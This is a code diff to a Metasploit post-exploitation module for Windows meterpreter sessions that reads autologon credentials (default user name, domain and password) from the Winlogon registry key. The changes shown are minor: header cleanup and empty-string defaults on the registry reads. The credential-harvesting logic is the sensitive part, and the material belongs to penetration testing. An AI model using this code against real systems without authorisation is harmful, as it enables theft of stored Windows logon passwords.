@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -31,9 +27,8 @@ class Metasploit3 < Msf::Post
 				'License'       => MSF_LICENSE,
 				'Author'        =>
 					[
-						'Myo Soe <YGN Ethical Hacker Group, http://yehg.net>'
+						'Myo Soe' #YGN Ethical Hacker Group, http://yehg.net
 					],
-				'Version'       => '$Revision$',
 				'Platform'      => [ 'win' ],
 				'SessionTypes'  => [ 'meterpreter' ],
 				'References'     =>
@@ -65,15 +60,15 @@ class Metasploit3 < Msf::Post
 		# DefaultDomainName, DefaultUserName, DefaultPassword
 		# AltDefaultDomainName, AltDefaultUserName, AltDefaultPassword
 		logon_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"
-		al = registry_getvaldata(logon_key, "AutoAdminLogon")
+		al = registry_getvaldata(logon_key, "AutoAdminLogon")        || ''
 
-		do1 = registry_getvaldata(logon_key, "DefaultDomainName")
-		du1 = registry_getvaldata(logon_key, "DefaultUserName")
-		dp1 = registry_getvaldata(logon_key, "DefaultPassword")
+		do1 = registry_getvaldata(logon_key, "DefaultDomainName")    || ''
+		du1 = registry_getvaldata(logon_key, "DefaultUserName")      || ''
+		dp1 = registry_getvaldata(logon_key, "DefaultPassword")      || ''
 
-		do2 = registry_getvaldata(logon_key, "AltDefaultDomainName")
-		du2 = registry_getvaldata(logon_key, "AltDefaultUserName")
-		dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")
+		do2 = registry_getvaldata(logon_key, "AltDefaultDomainName") || ''
+		du2 = registry_getvaldata(logon_key, "AltDefaultUserName")   || ''
+		dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")   || ''
 
 		if do1 != '' and  du1 != '' and dp1 == '' and al == '1'
 			has_al = 1
